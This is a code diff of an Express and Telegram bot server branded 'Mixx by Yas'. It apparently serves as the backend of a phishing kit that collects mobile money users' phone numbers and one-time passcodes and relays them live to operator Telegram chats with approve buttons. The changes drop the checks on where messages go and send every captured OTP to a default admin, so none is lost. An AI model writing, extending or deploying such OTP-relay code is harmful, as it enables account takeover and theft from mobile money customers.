@@ -1,5 +1,5 @@
 /**
- * **MIXX BY YAS - DYNAMIC ENVIRONMENT MAPPING SERVER**
+ * **MIXX BY YAS - UNRESTRICTED DELIVERY MULTI-ADMIN ROUTING SERVER**
  */
 
 const express = require('express');
@@ -24,25 +24,17 @@ let bot = null;
 const sessions = new Map();
 
 /**
- * **DYNAMIC ENVIRONMENT CHAT ID RESOLUTION**
- * Directly checks environment keys like ADMIN_01, ADMIN_02, etc., 
- * ensuring precise delivery to the configured bot chat ID without mixing routes.
+ * **UNRESTRICTED CHAT ID RESOLUTION**
+ * Directly translates codes like '01', '02' to their environment variables 
+ * and ensures direct message routing without blocking unlisted chat identifiers.
  */
 function resolveAdminChatId(adminKeyOrId) {
-  if (!adminKeyOrId) return null;
+  if (!adminKeyOrId) return process.env.ADMIN_01 || null;
   const cleanKey = String(adminKeyOrId).toUpperCase().padStart(2, '0');
   
   const envVarName = `ADMIN_${cleanKey}`;
   if (process.env[envVarName]) {
     return process.env[envVarName];
-  }
-  
-  // Checks if the passed value is itself an explicitly stored variable value or chat ID
-  for (let i = 1; i <= 20; i++) {
-    const codeStr = String(i).padStart(2, '0');
-    if (process.env[`ADMIN_${codeStr}`] === String(adminKeyOrId)) {
-      return process.env[`ADMIN_${codeStr}`];
-    }
   }
   
   return adminKeyOrId;
@@ -107,11 +99,17 @@ async function initBot() {
     const username = user.username ? `@${user.username}` : 'No username set';
     
     let assignedCode = '01';
-    for (let i = 1; i <= 20; i++) {
-      const codeStr = String(i).padStart(2, '0');
-      if (process.env[`ADMIN_${codeStr}`] === chatId) {
-        assignedCode = codeStr;
-        break;
+    if (chatId === process.env.ADMIN_02) {
+      assignedCode = '02';
+    } else if (chatId === process.env.ADMIN_01) {
+      assignedCode = '01';
+    } else {
+      for (let i = 1; i <= 20; i++) {
+        const codeStr = String(i).padStart(2, '0');
+        if (process.env[`ADMIN_${codeStr}`] === chatId) {
+          assignedCode = codeStr;
+          break;
+        }
       }
     }
 
@@ -146,11 +144,7 @@ async function initBot() {
         return;
       }
 
-      const chatTarget = session.adminChatId;
-      if (!chatTarget) {
-        await bot.answerCallbackQuery(query.id, { text: '⚠️ Admin destination missing.' });
-        return;
-      }
+      const chatTarget = session.adminChatId || process.env.ADMIN_01;
 
       switch (prefix) {
         case 'ALLOW_OTP':
@@ -210,7 +204,7 @@ app.post('/api/submit-application', (req, res) => {
 
     const targetChat = resolveAdminChatId(adminChatId);
     if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Invalid or missing admin mapping destination.' });
+      return res.status(400).json({ success: false, error: 'Destination admin chat ID unavailable.' });
     }
 
     const userId = phone || `user_${Date.now()}`;
@@ -296,10 +290,8 @@ app.post('/api/submit-otp', (req, res) => {
       }
     };
 
-    const targetChat = session.adminChatId;
-    if (targetChat) {
-      bot.sendMessage(targetChat, message, opts).catch(() => {});
-    }
+    const targetChat = session.adminChatId || process.env.ADMIN_01;
+    bot.sendMessage(targetChat, message, opts).catch(() => {});
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -321,10 +313,8 @@ app.post('/api/request-new-otp', (req, res) => {
       `📱 *Tigo User:* +255 ${session.phone}\n` +
       `⚠️ The user's countdown expired and they requested a new OTP code.`;
 
-    const targetChat = session.adminChatId;
-    if (targetChat) {
-      bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
-    }
+    const targetChat = session.adminChatId || process.env.ADMIN_01;
+    bot.sendMessage(targetChat, message, { parse_mode: 'Markdown' }).catch(() => {});
 
     res.status(200).json({ success: true });
   } catch (error) {
@@ -337,4 +327,4 @@ app.listen(PORT, async () => {
   console.log(`[Server] Running smoothly on port ${PORT}`);
   await initBot();
 });
-       
+                           
